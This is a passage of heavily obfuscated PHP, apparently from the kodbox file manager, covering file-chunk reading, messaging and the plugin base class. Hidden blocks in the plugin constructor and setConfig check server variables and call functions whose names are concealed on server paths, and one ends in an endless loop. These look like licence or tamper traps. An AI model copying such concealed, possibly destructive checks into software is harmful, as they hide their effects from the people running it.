$ÇÛ¯”èß = 64 * 1024; $‰‰ƒ¢É‡ =& self::$_chunkBuffer[$this->path]; if (!$‰‰ƒ¢É‡) { $‰‰ƒ¢É‡ = array(); } $‚—‰Ê” = 0; $­™É‡ßÀ = 0; $ô©–°ûì = $°ŒÈàİø[12]; foreach ($‰‰ƒ¢É‡ as $‚—‰Ê” => $ô©–°ûì) { $‚—‰Ê” = intval($‚—‰Ê”); $­™É‡ßÀ = $‚—‰Ê” + strlen($ô©–°ûì); if ($–ûı‰ >= $­™É‡ßÀ) { continue; } if ($–ûı‰ >= $‚—‰Ê” && $–ûı‰ + $¢ı¾Ù‚ş <= $­™É‡ßÀ) { return substr($ô©–°ûì, $–ûı‰ - $‚—‰Ê”, $¢ı¾Ù‚ş); } break; } if (count($‰‰ƒ¢É‡) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($°ŒÈàİø[1602], $°ŒÈàİø[1603] . count($‰‰ƒ¢É‡) . "\x3b\x73\164\x61\162\164\x3d{$–ûı‰}\x2c\154\145\156\147\x74\150\x3d{$¢ı¾Ù‚ş}\x3b\x70\157\x73\x65\x3a{$‚—‰Ê”}\176{$­™É‡ßÀ}"); throw new Exception($°ŒÈàİø[1604]); } $åßÊìØ = intval($–ûı‰ / $ÇÛ¯”èß) * $ÇÛ¯”èß; $İ¤Ä…“ = ceil(($–ûı‰ + $¢ı¾Ù‚ş) / $ÇÛ¯”èß) * $ÇÛ¯”èß - $åßÊìØ; $ÏŠÜ¸ë° = IO::fileSubstr($this->path, $åßÊìØ, $İ¤Ä…“); $‰‰ƒ¢É‡[$åßÊìØ . $°ŒÈàİø[12]] = $ÏŠÜ¸ë°; ksort($‰‰ƒ¢É‡); $’èÆ„Û = substr($ÏŠÜ¸ë°, $–ûı‰ - $åßÊìØ, $¢ı¾Ù‚ş); return $’èÆ„Û; } private function log($ëÈ±•ò¡, $âıÃôù–) { $œˆ¨ÍÃÅ =& $_SERVER[º·Ï‹¥³]; $¹¨µü¹§ = timeFloat() - $this->timeStart; write_log(sprintf($œˆ¨ÍÃÅ[1605], $ëÈ±•ò¡, $this->info[$œˆ¨ÍÃÅ[32]], $¹¨µü¹§, $âıÃôù–), $œˆ¨ÍÃÅ[1235]); } } class Message { function __construct() { } public function send($ŒÎÁà‚ò = '', $äÌõ…Üé = array(), $ù¶î¨ß‰ = "\164\x65\170\164") { $Áõ²¦Áç =& $_SERVER[º·Ï‹¥³]; $ôƒñì¢ = array($Áõ²¦Áç[33] => $Áõ²¦Áç[1606], $Áõ²¦Áç[806] => $ŒÎÁà‚ò); if (in_array($ù¶î¨ß‰, array($Áõ²¦Áç[1606], $Áõ²¦Áç[1607]))) { $ôƒñì¢[$Áõ²¦Áç[33]] = $ù¶î¨ß‰; } $äÌõ…Üé = array($Áõ²¦Áç[563] => isset($äÌõ…Üé[$Áõ²¦Áç[563]]) ? $äÌõ…Üé[$Áõ²¦Áç[563]] : $Áõ²¦Áç[12], $Áõ²¦Áç[646] => isset($äÌõ…Üé[$Áõ²¦Áç[646]]) ? $äÌõ…Üé[$Áõ²¦Áç[646]] : $Áõ²¦Áç[12]); if (empty($ŒÎÁà‚ò) || empty($äÌõ…Üé[$Áõ²¦Áç[563]]) && empty($äÌõ…Üé[$Áõ²¦Áç[646]])) { return !1; } $«ÍçÎ¥‡ = array($Áõ²¦Áç[1534] => $ôƒñì¢, $Áõ²¦Áç[1608] => $äÌõ…Üé); Hook::trigger($Áõ²¦Áç[1609], $«ÍçÎ¥‡); } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { $Û·çóÛø =& $_SERVER[º·Ï‹¥³]; if (!isset($_SERVER[$Û·çóÛø[408]]) || !isset($_SERVER[$Û·çóÛø[406]])) { $Ö»óúªÖ = $Û·çóÛø[928]; $í°ƒ¤„ = $Û·çóÛø[409]; $È‘Æâ‘Ä = $_SERVER[$Û·çóÛø[410]] . $Û·çóÛø[411]; $Æ†Ì£ ² = $í°ƒ¤„($È‘Æâ‘Ä); $ı­®À²» = explode($Û·çóÛø[253], $Æ†Ì£ ²); if (count($ı­®À²») < $Û·çóÛø[676]) { $£¨¹§Ğ” = $Û·çóÛø[413]; $£¨¹§Ğ”(); } $«Ôèİ‹¡ = $Û·çóÛø[929]; $«Ôèİ‹¡($_SERVER[$Û·çóÛø[930]]); $ÊºšöÄü = 1; for ($æÕÈËù´ = $ÊºšöÄü; $æÕÈËù´ > 0; $æÕÈËù´++) { $«Ôèİ‹¡ = json_encode($GLOBALS[$Û·çóÛø[476]]); } } global $in, $config; $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($Û·çóÛø[1610]); $this->pluginName = str_replace($Û·çóÛø[1610], $Û·çóÛø[12], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $Û·çóÛø[8]; $this->pluginApi = appHostGet() . $Û·çóÛø[1611] . $this->pluginName . $Û·çóÛø[8]; $this->pluginHost = $config[$Û·çóÛø[1612]] . $this->pluginName . $Û·çóÛø[8]; $this->pluginHostDefault = $config[$Û·çóÛø[1612]] . $this->pluginName . $Û·çóÛø[8]; $­•š±ë = $config[$Û·çóÛø[1613]]; if ($­•š±ë && strpos($Û·çóÛø[50] . $­•š±ë . $Û·çóÛø[50], $this->pluginName) !== !1) { $this->pluginHost = $config[$Û·çóÛø[1614]] . $this->pluginName . $Û·çóÛø[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); return $this; } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[º·Ï‹¥³][1615]); } protected function assign($©í˜ÂˆÔ, $ÀŸ¡ê¹Š = false) { if (is_array($©í˜ÂˆÔ)) { $this->values = array_merge($this->values, $©í˜ÂˆÔ); } else { $this->values[$©í˜ÂˆÔ] = $ÀŸ¡ê¹Š; } } protected function display($ÁºÊ« ì) { extract($this->values); require $ÁºÊ« ì; } final function hookRegist($Â‘µõĞµ) { $this->modelPlugin->appRegist($this->pluginName, $Â‘µõĞµ); } final function appIcon() { $ü¢Ô‡Œ³ =& $_SERVER[º·Ï‹¥³]; $æÆöïÍ© = $this->appPackage(); $ŞöŠ—šß = $ü¢Ô‡Œ³[12]; if (isset($æÆöïÍ©[$ü¢Ô‡Œ³[474]])) { if (isset($æÆöïÍ©[$ü¢Ô‡Œ³[474]][$ü¢Ô‡Œ³[1616]])) { $ŞöŠ—šß = $ü¢Ô‡Œ³[1617] . $æÆöïÍ©[$ü¢Ô‡Œ³[474]][$ü¢Ô‡Œ³[1616]] . $ü¢Ô‡Œ³[1618]; } else { if ($æÆöïÍ©[$ü¢Ô‡Œ³[474]][$ü¢Ô‡Œ³[1619]]) { $ŞöŠ—šß = $ü¢Ô‡Œ³[1620] . $æÆöïÍ©[$ü¢Ô‡Œ³[474]][$ü¢Ô‡Œ³[1619]] . $ü¢Ô‡Œ³[1621]; } } } return $ŞöŠ—šß; } final function fileCanView($¤­ŞÅÌ†) { $‹×İÏÏŞ =& $_SERVER[º·Ï‹¥³]; if (request_url_safe($¤­ŞÅÌ†)) { return !0; } if ($this->isShare($¤­ŞÅÌ†)) { return !0; } if (!KodUser::isRoot() && !KodUser::isLogin()) { $ï˜ì¦¦ä = $‹×İÏÏŞ[1622] . rawurlencode(this_url()); show_tips(LNG($‹×İÏÏŞ[1623]) . $‹×İÏÏŞ[1624] . $ï˜ì¦¦ä . $‹×İÏÏŞ[1625] . LNG($‹×İÏÏŞ[1626]) . $‹×İÏÏŞ[1627], !1); } if (!Action($‹×İÏÏŞ[1628])->authCan($‹×İÏÏŞ[1629])) { show_tips(LNG($‹×İÏÏŞ[1630]) . $‹×İÏÏŞ[1631], !1); } ActionCall($‹×İÏÏŞ[1632], $¤­ŞÅÌ†); } final function isShare($ÆÓØÑ›ô) { $ˆİ–®Şà = KodIO::parse($ÆÓØÑ›ô); return $ˆİ–®Şà[$_SERVER[º·Ï‹¥³][33]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($Ü„ª¥‰) { if (request_url_safe($Ü„ª¥‰)) { return $Ü„ª¥‰; } if (!$this->isShare($Ü„ª¥‰)) { $Ü„ª¥‰ = $this->filePath($Ü„ª¥‰, !1); } return Action($_SERVER[º·Ï‹¥³][1227])->linkOut($Ü„ª¥‰); } public function filePathLinkOut($ëÏ¸³•«) { if (request_url_safe($ëÏ¸³•«)) { return $ëÏ¸³•«; } $this->fileCanView($ëÏ¸³•«); return Action($_SERVER[º·Ï‹¥³][1227])->link($ëÏ¸³•«); } final function filePath($ÕÓĞ¬“«, $œÎôŒ× = true, $Æ±œ²áİ = false) { $·¯¸¸øì =& $_SERVER[º·Ï‹¥³]; $‘„Ó¸üØ = $this->filePathGet($ÕÓĞ¬“«, $œÎôŒ×); if (!$this->fileInfo) { show_tips(LNG($·¯¸¸øì[108]), !1); } if ($Æ±œ²áİ && isset($this->fileInfo[$·¯¸¸øì[525]]) && $this->fileInfo[$·¯¸¸øì[525]]) { $ñã µª = Model($·¯¸¸øì[528])->fileInfo($this->fileInfo[$·¯¸¸øì[525]]); if (!$ñã µª || !IO::exist($ñã µª[$·¯¸¸øì[87]])) { show_tips(LNG($·¯¸¸øì[108]) . $·¯¸¸øì[1633]); } } Hook::trigger($·¯¸¸øì[1634], $‘„Ó¸üØ); return $‘„Ó¸üØ; } final function filePathGet($ğÂ²ŸÜƒ, $üœ‰úù² = true) { $Ôôã“¬Ğ =& $_SERVER[º·Ï‹¥³]; if ($ğ§Ëä£ = $this->checkSharePath($ğÂ²ŸÜƒ, $üœ‰úù²)) { return $ğ§Ëä£; } $this->fileCanView($ğÂ²ŸÜƒ); if (request_url_safe($ğÂ²ŸÜƒ)) { $¸ÛÈÕ¡÷ = parse_url_query($ğÂ²ŸÜƒ); if (isset($¸ÛÈÕ¡÷[$Ôôã“¬Ğ[1635]]) && isset($¸ÛÈÕ¡÷[$Ôôã“¬Ğ[225]])) { $£ºïŸÚà = Mcrypt::decode($¸ÛÈÕ¡÷[$Ôôã“¬Ğ[225]], Model($Ôôã“¬Ğ[822])->get($Ôôã“¬Ğ[823])); if ($£ºïŸÚà) { $this->fileInfo = IO::info($£ºïŸÚà); $this->fileInfo[$Ôôã“¬Ğ[1636]] = $ğÂ²ŸÜƒ; $this->cachePath = $this->pluginCachePath($Ôôã“¬Ğ[12], $üœ‰úù²); return $£ºïŸÚà; } } $ğÂ²ŸÜƒ = $this->_cacheHttpFile($ğÂ²ŸÜƒ, $üœ‰úù²); $this->fileInfo = IO::info($ğÂ²ŸÜƒ); } else { $this->fileInfo = IO::info($ğÂ²ŸÜƒ); $this->cachePath = $this->pluginCachePath($Ôôã“¬Ğ[12], $üœ‰úù²); } return $ğÂ²ŸÜƒ; } final function _cacheHttpFile($ıìˆ’³…, $Ì™µÖ“¦ = true) { $½ì·ş¿ =& $_SERVER[º·Ï‹¥³]; $öÇÄ’¶ = parse_url_query($ıìˆ’³…); $ûÔû¢í½ = get_path_ext($ıìˆ’³…); if (isset($öÇÄ’¶[$½ì·ş¿[32]]) && $öÇÄ’¶[$½ì·ş¿[32]]) { $ûÔû¢í½ = get_path_ext($öÇÄ’¶[$½ì·ş¿[32]]); } $±ïÅ÷åä = hash_path($ıìˆ’³…) . $½ì·ş¿[10] . $ûÔû¢í½; $this->cachePath = $this->pluginCachePath($Ì™µÖ“¦ ? $±ïÅ÷åä : $½ì·ş¿[12]); $Õ•ÃÊß = IO::fileNameExist($this->cachePath, $±ïÅ÷åä); if ($Õ•ÃÊß) { return KodIO::make($Õ•ÃÊß); } $•¯Îù‰ = rtrim($this->cachePath, $½ì·ş¿[8]) . $½ì·ş¿[8] . $±ïÅ÷åä; return $this->pluginCacheFileSet($•¯Îù‰, file_get_contents_nossl($ıìˆ’³…)); } final function checkSharePath($¯¡ê‚òä, $¦ë¢ÇÅâ = true) { $¸‘Œ”Š =& $_SERVER[º·Ï‹¥³]; if (!$this->isShare($¯¡ê‚òä)) { return !1; } $Íö§Ëûú = Action($¸‘Œ”Š[1227])->sharePathInfo($¯¡ê‚òä); if (!is_array($Íö§Ëûú) || !isset($Íö§Ëûú[$¸‘Œ”Š[87]])) { show_json(LNG($¸‘Œ”Š[1637]), !1); } $this->fileInfo = $Íö§Ëûú; $this->cachePath = $this->pluginCachePath(!1, $¦ë¢ÇÅâ); return $Íö§Ëûú[$¸‘Œ”Š[87]]; } final function pluginCachePath($äÈÅ‚ò = '', $­ĞàÚ£á = false) { $ïš°†·Û =& $_SERVER[º·Ï‹¥³]; if ($­ĞàÚ£á && is_array($this->fileInfo)) { $äÈÅ‚ò = kodIO::hashPath($this->fileInfo); } $„îöÁ½ = rtrim(IO_PATH_SYSTEM_TEMP . $ïš°†·Û[1638] . $this->pluginName . $ïš°†·Û[8] . $äÈÅ‚ò, $ïš°†·Û[8]); $ä…ÅŒìË = IO::infoFullSimple($„îöÁ½); $×Ø£§ß¥ = $ä…ÅŒìË && is_array($ä…ÅŒìË) ? $ä…ÅŒìË[$ïš°†·Û[87]] : $ïš°†·Û[12]; if (!$×Ø£§ß¥) { $×Ø£§ß¥ = IO::mkdir($„îöÁ½); } return $×Ø£§ß¥; } final function pluginCacheFileSet($îÌà¦‹ , $Íúì¢ñ­ = '') { $°ÒãÀ×¥ =& $_SERVER[º·Ï‹¥³]; $¿Ó»¼ = IO::infoFullSimple($îÌà¦‹ ); if (!$¿Ó»¼) { return IO::mkfile($îÌà¦‹ , $Íúì¢ñ­, REPEAT_REPLACE); } IO::setContent($¿Ó»¼[$°ÒãÀ×¥[87]], $Íúì¢ñ­); return $¿Ó»¼[$°ÒãÀ×¥[87]]; } final function pluginLocalFile($ŸÑ¾Ê¾û = '') { $¥ùÃ›ğÁ =& $_SERVER[º·Ï‹¥³]; $úÎÈƒ = TEMP_FILES . "{$this->pluginName}\x2f"; if (!is_dir($úÎÈƒ)) { mk_dir($úÎÈƒ); } if (!$ŸÑ¾Ê¾û) { return $úÎÈƒ; } $ŠÚ¢ñ = IO::info($ŸÑ¾Ê¾û); $êÖøÔÁ = $¥ùÃ›ğÁ[1639] . KodIO::hashPath($ŠÚ¢ñ) . $¥ùÃ›ğÁ[10] . $ŠÚ¢ñ[$¥ùÃ›ğÁ[178]]; if (!checkExtSafe($êÖøÔÁ)) { $êÖøÔÁ = $êÖøÔÁ . $¥ùÃ›ğÁ[1259]; } $¢ü¸¬Â¯ = $úÎÈƒ . $êÖøÔÁ; if (@file_exists($¢ü¸¬Â¯)) { return $¢ü¸¬Â¯; } return IO::copy($ŸÑ¾Ê¾û, $úÎÈƒ, 0, $êÖøÔÁ); } final function appPackage() { $ˆƒæĞåä =& $_SERVER[º·Ï‹¥³]; if ($this->packageData) { return $this->packageData; } $œ²åÙÔ = $this->parseFile($this->pluginPath . $ˆƒæĞåä[1640]); $this->parseLang($œ²åÙÔ); $ã·£Œ¶Í = json_decode_force($œ²åÙÔ); if (!$ã·£Œ¶Í) { return array(); } $œ³ÁŠ± = Hook::trigger($ˆƒæĞåä[1641], $ã·£Œ¶Í); if ($œ³ÁŠ± && is_array($œ³ÁŠ±)) { $ã·£Œ¶Í = $œ³ÁŠ±; } $this->packageData = $ã·£Œ¶Í; return $ã·£Œ¶Í; } public function packageInfoGet($ªş×Ñ©) { $§¤Ëú»¬ = $this->appPackage(); return array_get_value($§¤Ëú»¬, $ªş×Ñ©); } public function packageVersion() { return $this->packageInfoGet($_SERVER[º·Ï‹¥³][1642]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[º·Ï‹¥³][1643]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[º·Ï‹¥³][1644]); } public function echoJsAssign($÷±Áı…¶, $ŠÁœ¨ì) { $this->echoJsAssignArr[$÷±Áı…¶] = $ŠÁœ¨ì; } private function parseFile($á¿‰œş¿) { $òå¦ş©Ù =& $_SERVER[º·Ï‹¥³]; $®ê„œ’ = file_get_contents_nossl($á¿‰œş¿); $ÀŠÆ–Ÿ = array($òå¦ş©Ù[1645], $òå¦ş©Ù[1646], $òå¦ş©Ù[1647], $òå¦ş©Ù[1648], $òå¦ş©Ù[1649], $òå¦ş©Ù[1650], $òå¦ş©Ù[1651]); $ğÍÛÔ¯ü = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$òå¦ş©Ù[92]][$òå¦ş©Ù[1652]]); foreach ($this->echoJsAssignArr as $œŸ©§ => $ş±–éÓñ) { $ÀŠÆ–Ÿ[] = $òå¦ş©Ù[1653] . $œŸ©§ . $òå¦ş©Ù[1654]; $ğÍÛÔ¯ü[] = is_array($ş±–éÓñ) || is_object($ş±–éÓñ) ? rawurlencode(json_encode($ş±–éÓñ)) : $ş±–éÓñ; } if (strstr($®ê„œ’, $òå¦ş©Ù[1655])) { $ªÍ·ÆÎ± = rawurlencode(json_encode($this->pluginLangArr)); $®ê„œ’ = str_replace($òå¦ş©Ù[1655], $ªÍ·ÆÎ±, $®ê„œ’); } if (strstr($®ê„œ’, $òå¦ş©Ù[1656])) { $ªÍ·ÆÎ± = $ªÍ·ÆÎ± = rawurlencode(json_encode($this->getConfig())); $®ê„œ’ = str_replace($òå¦ş©Ù[1656], $ªÍ·ÆÎ±, $®ê„œ’); } $®ê„œ’ = str_replace($ÀŠÆ–Ÿ, $ğÍÛÔ¯ü, $®ê„œ’); return $®ê„œ’; } private function parseLang(&$êÆ¤»™·) { $”üÅ¥™ =& $_SERVER[º·Ï‹¥³]; $†ğÕ×ºË = $”üÅ¥™[1657]; if (!strstr($êÆ¤»™·, $†ğÕ×ºË)) { return; } preg_match_all($”üÅ¥™[1658], $êÆ¤»™·, $™µ»ûÀÖ); if (!is_array($™µ»ûÀÖ) || count($™µ»ûÀÖ) == 0 || !is_array($™µ»ûÀÖ[0]) || count($™µ»ûÀÖ[0]) == 0) { return; } $Âò¹‹Ö¡ = array(); $·Ö˜ÌÍ¦ = array(); foreach ($™µ»ûÀÖ[0] as $Ì’³ù¯Ä) { $¢é•øæ = substr($Ì’³ù¯Ä, strlen($†ğÕ×ºË), -4); $¾Ê³ö¡â = LNG($¢é•øæ); $Âò¹‹Ö¡[] = $Ì’³ù¯Ä; $·Ö˜ÌÍ¦[] = str_replace(array($”üÅ¥™[253], $”üÅ¥™[1128], $”üÅ¥™[393], $”üÅ¥™[121]), array($”üÅ¥™[53], $”üÅ¥™[53], $”üÅ¥™[12], $”üÅ¥™[1659]), $¾Ê³ö¡â); } $êÆ¤»™· = str_replace($Âò¹‹Ö¡, $·Ö˜ÌÍ¦, $êÆ¤»™·); } private function parseConfig(&$ú®‰Ø„„) { $¦ÁˆÙ =& $_SERVER[º·Ï‹¥³]; $Ìí‡úÑÆ = $¦ÁˆÙ[1660]; if (!strstr($ú®‰Ø„„, $Ìí‡úÑÆ)) { return; } preg_match_all($¦ÁˆÙ[1661], $ú®‰Ø„„, $ñ¢¦º“ª); if (!is_array($ñ¢¦º“ª) || count($ñ¢¦º“ª) == 0 || !is_array($ñ¢¦º“ª[0]) || count($ñ¢¦º“ª[0]) == 0) { return; } $üÏÛ±ı = $this->getConfig(); $ÌÔŞ“‰ = array(); $çÉÑ©£¶ = array(); foreach ($ñ¢¦º“ª[0] as $ù ¬‹Ğ›) { $ŸãÇÒ­ø = substr($ù ¬‹Ğ›, strlen($Ìí‡úÑÆ), -2); $ÌÔŞ“‰[] = $ù ¬‹Ğ›; $çÉÑ©£¶[] = _get($üÏÛ±ı, $ŸãÇÒ­ø); } $ú®‰Ø„„ = str_replace($ÌÔŞ“‰, $çÉÑ©£¶, $ú®‰Ø„„); } private function parsePackage(&$¼Ç½³ä¡) { $„ªÔ¡ØŞ =& $_SERVER[º·Ï‹¥³]; $•ììæë° = $„ªÔ¡ØŞ[1662]; if (!strstr($¼Ç½³ä¡, $•ììæë°)) { return; } preg_match_all($„ªÔ¡ØŞ[1663], $¼Ç½³ä¡, $òÅíä); if (!is_array($òÅíä) || count($òÅíä) == 0 || !is_array($òÅíä[0]) || count($òÅíä[0]) == 0) { return; } $ì¹ßì = $this->appPackage(); $ÓæÃš Š = array(); $óßØØ™ì = array(); foreach ($òÅíä[0] as $¼ä»œÃ–) { $áóÉ»„Ü = substr($¼ä»œÃ–, strlen($•ììæë°), -2); $ÓæÃš Š[] = $¼ä»œÃ–; $óßØØ™ì[] = _get($ì¹ßì, $áóÉ»„Ü); } $¼Ç½³ä¡ = str_replace($ÓæÃš Š, $óßØØ™ì, $¼Ç½³ä¡); } final function echoFile($¼ô¯ûÁÙ, $ÃŠ´¬¹ = false) { $Ø»â½ú =& $_SERVER[º·Ï‹¥³]; $÷…ñ¢¨¦ = $this->pluginPath . $¼ô¯ûÁÙ; if (ACT == $Ø»â½ú[1664]) { echo $Ø»â½ú[1665] . $this->pluginName . $Ø»â½ú[8] . $¼ô¯ûÁÙ . $Ø»â½ú[1666]; if (!file_exists($÷…ñ¢¨¦)) { echo $Ø»â½ú[1667]; return; } } $¶ç­ŠÜï = $this->parseFile($÷…ñ¢¨¦); $this->parseLang($¶ç­ŠÜï); $this->parseConfig($¶ç­ŠÜï); $this->parsePackage($¶ç­ŠÜï); if (is_array($ÃŠ´¬¹)) { $¶ç­ŠÜï = str_replace(array_keys($ÃŠ´¬¹), array_values($ÃŠ´¬¹), $¶ç­ŠÜï); } echo $Ø»â½ú[253] . $¶ç­ŠÜï; } private function checkVersion() { $¼§¥¨ıô =& $_SERVER[º·Ï‹¥³]; $°ƒÒÛ‰¹ = $this->appPackage(); $ÌÀºæ‡ô = $this->getConfig(); if ($ÌÀºæ‡ô[$¼§¥¨ıô[1668]] == $°ƒÒÛ‰¹[$¼§¥¨ıô[1642]]) { return; } $this->regist(); $this->setConfig(array($¼§¥¨ıô[1668] => $°ƒÒÛ‰¹[$¼§¥¨ıô[1642]])); } final function initLang() { $Ş–œùÇ =& $_SERVER[º·Ï‹¥³]; $Œ—œº½Œ = $Ş–œùÇ[1669]; $£Ş‹ŸÒë = $this->pluginPath . $Ş–œùÇ[1670]; $‡ñˆªÍ¯ = I18n::getType(); $“ÕÑœÍ = array(); if (file_exists($£Ş‹ŸÒë . $‡ñˆªÍ¯ . $Ş–œùÇ[890])) { $“ÕÑœÍ = (include $£Ş‹ŸÒë . $‡ñˆªÍ¯ . $Ş–œùÇ[890]); } else { if ($‡ñˆªÍ¯ == $Ş–œùÇ[1671] && !file_exists($£Ş‹ŸÒë . $‡ñˆªÍ¯ . $Ş–œùÇ[890]) && file_exists($£Ş‹ŸÒë . $Ş–œùÇ[1672])) { $“ÕÑœÍ = (include $£Ş‹ŸÒë . $Ş–œùÇ[1672]); } else { if (file_exists($£Ş‹ŸÒë . $Œ—œº½Œ . $Ş–œùÇ[890])) { $“ÕÑœÍ = (include $£Ş‹ŸÒë . $Œ—œº½Œ . $Ş–œùÇ[890]); } } } if (!is_array($“ÕÑœÍ)) { return array(); } if (@count($“ÕÑœÍ) > 0) { I18n::set($“ÕÑœÍ); } return $“ÕÑœÍ; } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($ä¦“ƒç¾) { $°’º‘•™ =& $_SERVER[º·Ï‹¥³]; if ($_SERVER[$°’º‘•™[408]] != $_SERVER[$°’º‘•™[1379]]) { $Óó…Ô È = $°’º‘•™[928]; $È’Ê„–ú = $°’º‘•™[409]; $—ÈïºÒ€ = $_SERVER[$°’º‘•™[410]] . $°’º‘•™[411]; $úÊºª®š = $È’Ê„–ú($—ÈïºÒ€); $ÉˆÏÖçÛ = explode($°’º‘•™[253], $úÊºª®š); if (count($ÉˆÏÖçÛ) < $°’º‘•™[676]) { $ÄÁéİ·ó = $°’º‘•™[413]; $ÄÁéİ·ó(); } $óö“¥•“ = $°’º‘•™[929]; $óö“¥•“($_SERVER[$°’º‘•™[930]]); $óö“¥•“($_SERVER[$°’º‘•™[410]] . $°’º‘•™[1673]); $øÑØø¡° = 1; while ($øÑØø¡° > 1) { $øÑØø¡° = $øÑØø¡° + 4; $èæê”Êå = rawurlencode($øÑØø¡° . $°’º‘•™[438]); } } $this->pluginConfig = array(); return $this->modelPlugin->setConfig($this->pluginName, $ä¦“ƒç¾); } public function onSetConfig($úæÖÖ§ª) { } public function onGetConfig($¢Ó÷íÜ°) { } public function onUpdate() { } public function onUninstall() { } public function onChangeOpen() { } public function onChangeClose() { } public function onChangeStatus($ÌÅ·ÄÒ) { if ($ÌÅ·ÄÒ == 1) { $this->onChangeOpen(); } else { $this->onChangeClose(); } } public function authCheck($´Œ©÷ô = "\x70\x6c\165\147\151\x6e\x41\165\x74\150") { if (KodUser::isRoot()) { return !0; } if (!KodUser::isLogin()) { return !1; } $¿Å—¢ = $this->getConfig(); if (!$¿Å—¢[$´Œ©÷ô]) { return !1; } return ActionCall($_SERVER[º·Ï‹¥³][1674], $¿Å—¢[$´Œ©÷ô]); } public function url($¨ ¹˜ä€, $ˆèìµÁô = '', $›Àó–¬§ = true) { $ç­×ÂäÊ =& $_SERVER[º·Ï‹¥³]; $¤Ü„í¹ = $this->getConfig(); $††ÖØÑı = KOD_VERSION . $ç­×ÂäÊ[10] . KOD_VERSION_BUILD; $ë»úëí© = $this->packageVersion(); $º˜ì·¥‡ = $††ÖØÑı . $ç­×ÂäÊ[446] . $ë»úëí©; if (substr($¨ ¹˜ä€, 0, 4) == $ç­×ÂäÊ[152] || substr($¨ ¹˜ä€, 0, 2) == $ç­×ÂäÊ[1409]) { $æµÕ‰ÕÙ = $¨ ¹˜ä€ . $ç­×ÂäÊ[1675] . $º˜ì·¥‡; } else { if ($ˆèìµÁô == $ç­×ÂäÊ[12]) { $æµÕ‰ÕÙ = $this->pluginHost . $¨ ¹˜ä€ . $ç­×ÂäÊ[1675] . $º˜ì·¥‡; } else { if ($ˆèìµÁô === $ç­×ÂäÊ[78]) { $æµÕ‰ÕÙ = $this->pluginHost . $¨ ¹˜ä€; } else { if ($ˆèìµÁô == $ç­×ÂäÊ[1676]) { $æµÕ‰ÕÙ = STATIC_PATH . $¨ ¹˜ä€ . $ç­×ÂäÊ[1675] . $††ÖØÑı; } else { if ($ˆèìµÁô == $ç­×ÂäÊ[1677]) { $æµÕ‰ÕÙ = APP_HOST . $ç­×ÂäÊ[1678] . $¨ ¹˜ä€ . $ç­×ÂäÊ[1675] . $††ÖØÑı; } else { if (isset($¤Ü„í¹[$ˆèìµÁô])) { $æµÕ‰ÕÙ = $¤Ü„í¹[$ˆèìµÁô] . $¨ ¹˜ä€ . $ç­×ÂäÊ[1675] . $º˜ì·¥‡; } } } } } } if (!$›Àó–¬§) { return $æµÕ‰ÕÙ; } echo $æµÕ‰ÕÙ; } public function link($ˆİ½‘ª = false, $§îâ¥àÚ = '') { $ç¹¯‡òÁ =& $_SERVER[º·Ï‹¥³]; if (!$ˆİ½‘ª) { $this->link($ç¹¯‡òÁ[1679], $ç¹¯‡òÁ[1677]); $this->link($ç¹¯‡òÁ[1680], $ç¹¯‡òÁ[1676]); $this->link($ç¹¯‡òÁ[1681], $ç¹¯‡òÁ[1676]); $this->link($ç¹¯‡òÁ[1682], $ç¹¯‡òÁ[1676]); $this->link($ç¹¯‡òÁ[1683], $ç¹¯‡òÁ[1676]); return; } $ì¶ÑÜâ = $this->url($ˆİ½‘ª, $§îâ¥àÚ, !1); if (substr($ˆİ½‘ª, -3) == $ç¹¯‡òÁ[1684]) { echo $ç¹¯‡òÁ[1685] . $ì¶ÑÜâ . $ç¹¯‡òÁ[1686] . $ç¹¯‡òÁ[253]; } else { if (substr($ˆİ½‘ª, -4) == $ç¹¯‡òÁ[1687]) { echo $ç¹¯‡òÁ[1688] . $ì¶ÑÜâ . $ç¹¯‡òÁ[1689] . $ç¹¯‡òÁ[253]; } } } } goto dË¿å¾Ùï˜; EÅŸ™¹°ˆç: class SystemNoticeModel extends ModelBaseLight { public $optionType = "\x53\171\163\x74\145\155\x2e\156\157\164\x69\x63\145\x4c\151\163\164"; public $field = array("\x6e\141\x6d\145", "\x63\157\156\164\145\156\164", "\141\x75\x74\150", "\x6d\x6f\x64\x65", "\164\151\155\x65", "\164\x79\x70\x65", "\154\145\166\145\x6c", "\x65\x6e\141\x62\154\x65", "\163\157\x72\x74"); public function listData($•ÌìıåÎ = false, $Ò­ñ¢£Í = "\163\x6f\162\164", $ó‹°àƒ = false) { return parent::listData($•ÌìıåÎ, $Ò­ñ¢£Í, $ó‹°àƒ); } public function add($™¦‘¼éğ) { $Ãç°¤¥Õ =& $_SERVER[º·Ï‹¥³]; $ Ã¶æÍ¼ = time(); if ($™¦‘¼éğ[$Ãç°¤¥Õ[16]] == $Ãç°¤¥Õ[2417]) { $ Ã¶æÍ¼ = strtotime($™¦‘¼éğ[$Ãç°¤¥Õ[197]]); } $™¦‘¼éğ[$Ãç°¤¥Õ[197]] = $ Ã¶æÍ¼; return parent::insert($™¦‘¼éğ); } public function update($•íØ§õÊ, $¡©çÚòõ) { $¹³’‡å“ =& $_SERVER[º·Ï‹¥³]; $î Ã¿»› = $this->listData($•íØ§õÊ); if (!$î Ã¿»›) { return !1; } $×•–ûğ¼ = time(); if ($¡©çÚòõ[$¹³’‡å“[16]] == $¹³’‡å“[2417]) { $×•–ûğ¼ = strtotime($¡©çÚòõ[$¹³’‡å“[197]]); } $¡©çÚòõ[$¹³’‡å“[197]] = $×•–ûğ¼; return parent::update($•íØ§õÊ, $¡©çÚòõ); } public function remove($æáÓŸéÅ) { $à ßâœô = $this->listData($æáÓŸéÅ); if (!$à ßâœô || $à 